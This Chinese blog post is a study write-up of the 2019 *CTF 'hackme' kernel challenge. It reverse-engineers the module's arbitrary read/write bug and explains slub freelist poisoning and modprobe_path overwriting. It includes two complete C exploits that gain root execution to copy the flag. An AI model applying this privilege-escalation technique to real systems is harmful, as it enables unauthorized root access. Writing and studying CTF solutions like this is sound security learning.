---
title: 关于 kernel-RW Any Memory 的学习总结
tags:
  - kernel-RW Any Memory
categories:
  - 学习总结
abbrlink: 12effc43
---

通过本题的学习，了解到了在内核的内存具有任意地址读写的能力后，可以利用的手法。



### 前置知识

`modprobe` 是一个 `Linux` 程序，用于在 `Linux` 内核中添加或移除一个可加载内核模块，该程序的路径是内核全局变量，默认为 `/sbin/modprobe`，存在在内核符号 `modprobe_path` 下（此处内存有可写权限）。

当执行的文件类型为系统未知的类型时（也就是未知的文件魔术头），将通过 `modprobe_path` 来执行 `modprobe` 程序。需要注意的是，`modprobe_path` 中存储的路径并不会被判断是否正常，无论路径指向的是哪个文件，都会将其执行，因为系统仍然处于内核模式，所以是以 `root` 权限执行的目标文件，如果目标文件是我们编写的 `shell` 脚本，那么就相当于我们具有了 `root` 权限下的任意执行命令的能力。

因此如果有任意地址读写的能力，可以考虑覆盖 `modprobe_path` ，它比起调用`commit_creds(prepare_kernel_cred(0))` 更方便。



题目是 2019STARCTF hackeme 链接：https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme

### 逆向分析

通过下面的 `_kmalloc` 函数，可以分析出来 `v19` 是 `size`

![image-20230410201237881](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102012069.png)





而程序最开始有一个 `copy_from_user` 函数， `copy` 了 `32` 个字节的数据，正好是可以控制从 `v17` 开始到 `v20` ，考虑到上面 `v19` 是个 `size` ，我们可以猜测这四个变量都是一个结构体中的成员变量

![image-20230410201412269](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102014305.png)



通过这三行代码，可以猜测出来 `v17` 是一个 `index` ，其决定了申请出来堆块的地址放到 `pool` 数组的哪个位置（ `pool` 数组就是来存放申请的堆块地址的）

![image-20230410203337467](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102033502.png)





这里将 `v18` 中的数据 `copy` 到了刚刚申请的堆块中，所以我们判断 `v18` 是 `data_ptr`

![image-20230410211733810](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102117851.png)



程序中的 `v20` ，刚开始看感觉很奇怪，具体啥作用也说不上来，因为 `v4` 已经是堆地址了，所以加上的 `v20` 我们姑且称之为 `offset`

![image-20230410212250229](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102122263.png)



四个变量名字确定之后，开始分析程序

#### delete

![image-20230410215435020](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102154053.png)

首先是 `delete` 部分（如上），发现这个 `kfree()` 很奇怪，因为 `IDA` 生成的伪代码看不到参数，溯源一下汇编发现 `kfree` 的参数其实就是 `v14` （如下）

![image-20230410215111627](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102151664.png)



#### add

这个 `add` 部分可以发现 `v12[0]` 存放的是申请的 `chunk_addr` ，`v12[1]` 存放的是 `size` ，而 `v12` 本身就是 `pool[2*index]` 数组的地址，因此 `chunk_addr` 和 `size` 都记录在了 `pool` 数组中。通过 `copy_from_user` 函数向堆块中写入数据。

![image-20230410215619344](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102156379.png)



#### show

![image-20230410222056453](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102220490.png)

如上图所示， `v5[1]` 是 `idx` 对应堆块的 `size` ，这里的 `offset+size` 只判断了是否小于 `v5[1]` ，但是忘记判断了 `offset+size` 要大于 `0`，所以这里的 `offset` 可以为负值，如果 `offset` 为负数的话，就导致了 `offset+chunk_addr` 拷贝的并不是当前指定的堆块中数据，可能是上一个堆块（低地址处）的数据，在这个 `show` 部分相当于任意地址读



#### edit

![image-20230410222823697](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102228740.png)

和上面 `show` 部分的漏洞一样， `offset` 值可以为负，从而可以任意地址写。



### 利用思路

`slub` 分配器是 `Linux` 内核中的一种内存分配器,其分配原理和 `fastbin` 原理类似，不过这里分配的堆块没有堆块头，也就是不加 `0x10` ，申请多少就是多少。

利用思路就是类似于 `fastbin attack` 的手法，数组索引向上（低地址）溢出，覆盖 `fd` 指针，从而实现任意地址申请和泄露。首先去泄露出内核基地址，然后加上 `mod_tree` 在内核中的偏移（ `mod_tree` 在内核中，而里面有模块的指针，所以通常我们用它来泄露出模块的基地址）得到 `mod_tree` 地址，将其申请出来，泄露出模块的基地址。有了模块的地址，我们就可以将 `pool` 数组申请出来写入 `modprobe_path` 指针（该指针在内核中），用 `edit` 功能实现任意地址写（我猜测无法直接将 `fd` 指针控制为 `modprobe_path` 申请出来然后写入数据的原因是这样会破坏原本内核中的堆结构，如果利用 `pool` 数组任意写的话，可以将之前的堆结构再恢复）

上面的过程和做 `glibc` 堆题的思想基本一致，具体过程就不再赘述。

但我一直不明白为什么我的脚本会导致内核崩溃，就是执行完篡改 `modprobe_path` 都没有崩溃，可以看到下图是改写成功的

![image-20230417202505374](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172038840.png)

此时也没有崩溃，但是再返回到用户态调用函数或者再运行一次脚本，内核就会崩溃重启。

可能是我破坏了某些堆结构？可是我将之前全部破坏的指针又用任意地址写恢复了，emmm 因为是完全自己写的，所以可能是某个奇奇怪怪的地方搞坏了，不过最终思想是没问题的，因为确实是成功改掉了路径。

下面放一下我这个会崩溃的 `EXP` ... 也算记录一下

### EXP

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

struct data_info
{
    size_t index;
    size_t *user_ptr;
    size_t size;
    size_t offset;
};

void add(int fd,size_t index,size_t *ptr,size_t size)
{
    struct data_info data;
    data.index=index;
    data.size=size;
    data.user_ptr=ptr;
    data.offset=0;
    ioctl(fd,0x30000,&data);
}

void edit(int fd,size_t index,size_t *ptr,size_t size,size_t offset)
{
    struct data_info data;
    data.index=index;
    data.size=size;
    data.user_ptr=ptr;
    data.offset=offset;
    ioctl(fd,0x30002,&data);
}

void delete(int fd,size_t index)
{
    struct data_info data;
    data.index=index;
    data.size=0;
    data.offset=0;
    data.user_ptr=NULL;
    ioctl(fd,0x30001,&data);
}

void show(int fd,size_t index,size_t *ptr,size_t size,size_t offset)
{
    struct data_info data;
    data.index=index;
    data.size=size;
    data.user_ptr=ptr;
    data.offset=offset;
    ioctl(fd,0x30003,&data);
}



void init()
{
    setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
}

int main()
{
    init();
    char *mem=malloc(0x1000);
    int fd=open("/dev/hackme",0);
    if(fd<0)
    {
        printf("open error!\n");
        exit(0);
    }
    add(fd,0,mem,0x100);
    show(fd,0,mem,0x200,-0x1e0);
    write(1,mem,16);
    size_t kernel_address = *((size_t *)mem);  
    size_t leak_heap = *((size_t *)(mem+0x20));
    printf("[*] leak kernel address %llx\n",kernel_address);
    printf("[*] leak heap address 0x%llx\n",leak_heap);

    size_t kernel_base=kernel_address-0x847240;
    printf("kernel base %llx\n",kernel_base);
    size_t mod_tree=kernel_base+0x811000+0x100;
    printf("mod tree %llx\n",mod_tree);
    add(fd,1,mem,0x100);
    delete(fd,0);

    //attack
    edit(fd,1,&mod_tree,0x200,-0x100);
    memset(mem,'A',0x100);
    add(fd,2,mem,0x100);
    add(fd,3,mem,0x100);
    show(fd,3,mem,0x110,-0x100);
    size_t hackme_base = *((size_t *)(mem+8))-0x2320;
    printf("hackme_base %llx\n",hackme_base); 
    size_t pool=hackme_base+0x2400+0xc0;
    printf("pool address %llx\n",pool);
    

    add(fd,4,mem,0x200);
    add(fd,5,mem,0x200);
    delete(fd,4);
    size_t modprobe_math=kernel_base+0x83f960;
    printf("modprobe_math %llx\n",modprobe_math);
    edit(fd,5,&pool,0x240,-0x200);
    add(fd,6,mem,0x200);
    int fake_size=0x200;
    *((size_t *)mem)=modprobe_math;
    *((size_t *)(mem+8))=fake_size;
    *((size_t *)(mem+0x10))=leak_heap+0x1b0;
    *((size_t *)(mem+0x18))=fake_size;
    *((size_t *)(mem+0x20))=leak_heap+0xe02bfb0;
    *((size_t *)(mem+0x28))=fake_size;


    add(fd,7,mem,0x200);
    char *str=malloc(0x100);
    size_t data1=leak_heap+0x3b0;
    size_t data2=leak_heap+0xe02c3b0;
    strncpy(str,"/home/pwn/copy.sh\0",18);

    printf("[*] leak heap address 0x%llx\n",leak_heap);
    edit(fd,0xc,str,18,0);
    edit(fd,0xd,&data1,8,0);
    edit(fd,0xe,&data2,8,0);

    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
    system("chmod +x /home/pwn/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/sir");
    system("chmod +x /home/pwn/sir");
 
    system("/home/pwn/sir");
    system("cat /home/pwn/flag");
}
```



下面是 [P4nda](http://p4nda.top/) 师傅的脚本，我和他的思路差不多

```c
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define ALLOC 0x30000
#define DEL 0x30001
#define READ 0x30003
#define WRITE 0x30002

struct arg
{
	size_t idx;
	void *addr;
	long long len;
	long long offset;
};

void alloc(int fd,int idx,char *user,long long len){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	ioctl(fd,ALLOC,&cmd);
}

void delete(int fd,int idx){
	struct arg cmd;
	cmd.idx = idx;
	ioctl(fd,DEL,&cmd);
}

void read_from_kernel(int fd,int idx,char *user,long long len,long long offset){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	cmd.offset = offset;
	ioctl(fd,READ,&cmd);	
}
void write_to_kernel(int fd,int idx,char *user,long long len,long long offset){
	struct arg cmd;
	cmd.idx = idx;
	cmd.len = len;
	cmd.addr = user;
	cmd.offset = offset;
	ioctl(fd,WRITE,&cmd);	
}

void print_hex( char *buf,int size){
	int i;
	puts("======================================");
	printf("data :\n");
	for (i=0 ; i<(size/8);i++){
		if (i%2 == 0){
			printf("%d",i/2);
		}
		printf(" %16llx",*(size_t * )(buf + i*8));
		if (i%2 == 1){
			printf("\n");
		}		
	}
	puts("======================================");
}

int main(){
	int fd = open("/dev/hackme", 0);
	char *mem = malloc(0x1000);
	size_t heap_addr , kernel_addr,mod_addr;
	if (fd < 0){
		printf("[-] bad open /dev/hackme\n");
		exit(-1);
	}
	memset(mem,'A',0x100);
	alloc(fd,0,mem,0x100);
	alloc(fd,1,mem,0x100);
	alloc(fd,2,mem,0x100);
	alloc(fd,3,mem,0x100);
	alloc(fd,4,mem,0x100);

	
	delete(fd,1);
	delete(fd,3);

	
	read_from_kernel(fd,4,mem,0x100,-0x100);
	heap_addr = *((size_t  *)mem);
	printf("[+] heap addr : %16llx\n",heap_addr );
	read_from_kernel(fd,0,mem,0x200,-0x200);
	kernel_addr = *((size_t  *)(mem+0x28)) ;
	if ((kernel_addr & 0xfff) != 0xae0){
		printf("[-] maybe bad kernel leak : %16llx\n",kernel_addr);
		exit(-1);
	}
		
	kernel_addr -= 0x849ae0; //0x849ae0 - sysctl_table_root
	printf("[+] kernel addr : %16llx\n",kernel_addr );	
	
	memset(mem,'A',0x100);
	*((size_t *)mem) = (0x811000 + kernel_addr + 0x40); // mod_tree +0x40
	write_to_kernel(fd,4,mem,0x100,-0x100);
	
	alloc(fd,5,mem,0x100);
	alloc(fd,6,mem,0x100);

	read_from_kernel(fd,6,mem,0x40,-0x40);
	mod_addr =  *((size_t  *)(mem+0x18)) ;
	printf("[+] mod addr : %16llx\n",mod_addr );	
	
	delete(fd,2);
	delete(fd,5);

	*((size_t *)mem) = (0x2400 + mod_addr + 0xc0); // mod_tree +0x40
	write_to_kernel(fd,4,mem,0x100,-0x100);
	alloc(fd,7,mem,0x100);
	*((size_t *)(mem+0x8)) = 0x100; 
	*((size_t *)mem) = (0x83f960 + kernel_addr ); //ffffffff8183f960 D modprobe_path
	alloc(fd,8,mem,0x100); // pool

	strncpy(mem,"/home/pwn/copy.sh\0",18);
	write_to_kernel(fd,0xc,mem,18,0);

	system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
	system("chmod +x /home/pwn/copy.sh");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
	system("chmod +x /home/pwn/dummy");

	system("/home/pwn/dummy");
	system("cat flag");
}
```

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172129949.png" alt="image-20230417212958765" style="zoom:50%;" />





## 参考文章

[(47条消息) linux kernal pwn STARCTF 2019 hackme（一） 劫持modprobe_path_yongbaoii的博客-CSDN博客](https://blog.csdn.net/yongbaoii/article/details/123583502)

[XCTF - *CTF 2019 - hack_me | kileak](https://kileak.github.io/ctf/2019/xctf-hackme/)

[(*´∇｀*) 天亮了~ 【KERNEL PWN】STARCTF 2019 hackme 解题思路 | p4nda's blog](http://p4nda.top/2019/05/01/starctf-2019-hackme/)

[[原创\]Linux Kernel Exploit 内核漏洞学习(4)-RW Any Memory-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)](https://bbs.kanxue.com/thread-254178.htm)

[基于modprobe_path覆盖的Linux内核漏洞利用技术 - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/153929.html)
